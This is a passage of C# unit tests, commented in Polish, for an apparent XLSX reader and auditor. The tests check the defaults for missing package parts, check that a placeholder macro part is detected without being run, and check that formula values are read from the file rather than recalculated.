        var parts = SmallWorkbookParts().Where(p => p.Key is not ("xl/styles.xml" or "xl/theme/theme1.xml" or "docProps/core.xml" or "docProps/app.xml" or "xl/sharedStrings.xml"))
            .ToDictionary(p => p.Key, p => p.Value);

        var workbook = XlsxTestData.Read(Repack(parts));

        Assert.Equal(XlsxDocumentProperties.Empty, workbook.Properties);
        Assert.Equal(XlsxTheme.Office.ColorsHex, workbook.Theme.ColorsHex);
        var format = Assert.Single(workbook.Styles.CellFormats);
        Assert.Equal(("Calibri", 11d, "General", true), (format.Font.Name, format.Font.SizePt, format.NumberFormat, format.Locked));
        Assert.Equal("", workbook.Sheets[0].TextAt(CellRef.Parse("A1")));
        Assert.Equal("1", workbook.Sheets[0].TextAt(CellRef.Parse("B1")));
    }

    [Fact]
    public void Macros_AreNeverExecuted_OnlyDetected()
    {
        // vbaProject.bin fixtury to atrapa tekstowa: gdyby cokolwiek próbowało ją interpretować, odczyt by się nie powiódł.
        var parts = FixtureXlsx.Parts(XlsxFixtureCatalog.Build("macro"));
        Assert.StartsWith("ATRAPA", Encoding.UTF8.GetString(parts["xl/vbaProject.bin"]));

        var result = Auditor.Audit(XlsxFixtureCatalog.Build("macro"));

        Assert.True(result.IsReadable);
        Assert.True(result.Workbook!.HasMacros);
    }

    [Fact]
    public void Formulas_AreNotRecalculated_ValuesComeFromFile()
    {
        // Formuła =1+1 z wartością 999 w pliku: model pokazuje 999.
        var fx = new FixtureXlsx();
        fx.AddSheet("Dane").Formula("A1", "1+1", "999").Formula("A2", "A1*2", null);
        var sheet = XlsxTestData.Read(fx.Build()).Sheets[0];

        Assert.Equal("999", sheet.TextAt(CellRef.Parse("A1")));
        Assert.Equal((XlsxCellType.Formula, "", false), (sheet.Cell(CellRef.Parse("A2"))!.Value.Type, sheet.TextAt(CellRef.Parse("A2")), sheet.Cell(CellRef.Parse("A2"))!.Value.HasValue));
    }
}
